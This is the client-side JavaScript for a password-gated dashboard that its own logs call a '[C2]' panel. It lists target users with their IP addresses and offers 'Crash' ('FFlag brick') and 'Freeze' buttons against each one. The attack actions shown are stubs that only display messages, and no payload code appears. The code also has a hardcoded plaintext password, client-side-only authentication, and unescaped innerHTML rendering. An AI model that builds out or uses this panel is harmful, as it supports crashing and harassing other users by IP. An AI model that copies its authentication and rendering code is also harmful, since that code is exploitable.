<script>
    let targets = [];

  const PASS = "YAYALIKEGIRLS";
  const gate = document.getElementById("gate");
  const dash = document.getElementById("dashboard");
  const passInput = document.getElementById("passInput");
  const enterBtn = document.getElementById("enterBtn");
  const gateError = document.getElementById("gateError");
  const searchInput = document.getElementById("searchInput");
  const targetBody = document.getElementById("targetBody");
  const emptyState = document.getElementById("emptyState");
  const statCount = document.getElementById("statCount");
  const statLast = document.getElementById("statLast");
  const toast = document.getElementById("toast");

  function showToast(msg, type) {
    toast.textContent = msg;
    toast.className = "toast show " + (type || "");
    clearTimeout(toast._t);
    toast._t = setTimeout(() => toast.classList.remove("show"), 3200);
  }

  function render(list) {
    targetBody.innerHTML = "";
    if (!list.length) {
      emptyState.style.display = "block";
      return;
    }
    emptyState.style.display = "none";
    list.forEach(t => {
      const tr = document.createElement("tr");
      const initial = t.user.charAt(0).toUpperCase();
      tr.innerHTML = `
        <td>
          <div class="user-cell">
            <div class="avatar">${initial}</div>
            <span class="uname">${t.user}</span>
          </div>
        </td>
        <td><span class="ip">${t.ip}</span></td>
        <td style="color:var(--muted);font-size:0.85rem">${t.seen}</td>
        <td>
          <div class="actions">
            <button class="btn btn-crash" data-user="${t.user}" data-act="crash">Crash</button>
            <button class="btn btn-freeze" data-user="${t.user}" data-act="freeze">Freeze</button>
          </div>
        </td>`;
      targetBody.appendChild(tr);
    });
  }

  function filter() {
    const q = searchInput.value.trim().toLowerCase();
    const filtered = targets.filter(t =>
      t.user.toLowerCase().includes(q) || t.ip.includes(q)
    );
    render(filtered);
  }

  function tryLogin() {
    if (passInput.value === PASS) {
      gate.classList.add("hidden");
      dash.classList.add("visible");
      localStorage.setItem("yaya_auth", "1");
      render(targets);
      statCount.textContent = targets.length;
      statLast.textContent = targets.length ? targets[0].seen : "—";
    } else {
      gateError.classList.add("show");
      passInput.value = "";
      passInput.focus();
      setTimeout(() => gateError.classList.remove("show"), 1800);
    }
  }

  enterBtn.addEventListener("click", tryLogin);
  passInput.addEventListener("keydown", e => { if (e.key === "Enter") tryLogin(); });

  document.getElementById("logoutBtn").addEventListener("click", () => {
    localStorage.removeItem("yaya_auth");
    location.reload();
  });

  searchInput.addEventListener("input", filter);

  targetBody.addEventListener("click", e => {
    const btn = e.target.closest(".btn");
    if (!btn) return;
    const user = btn.dataset.user;
    const act = btn.dataset.act;

    if (act === "crash") {
      showToast(`Crash payload queued → ${user}  (FFlag brick)`, "crash");
      console.log(`[C2] crash FFlag packet → ${user}`);
    } else if (act === "freeze") {
      showToast(`Freeze packet sent → ${user}`, "freeze");
      console.log(`[C2] freeze packet → ${user}`);
    }
  });

  if (localStorage.getItem("yaya_auth") === "1") {
    gate.classList.add("hidden");
    dash.classList.add("visible");
    render(targets);
    statCount.textContent = targets.length;
    statLast.textContent = "—";
  } else {
    passInput.focus();
  }
</script>
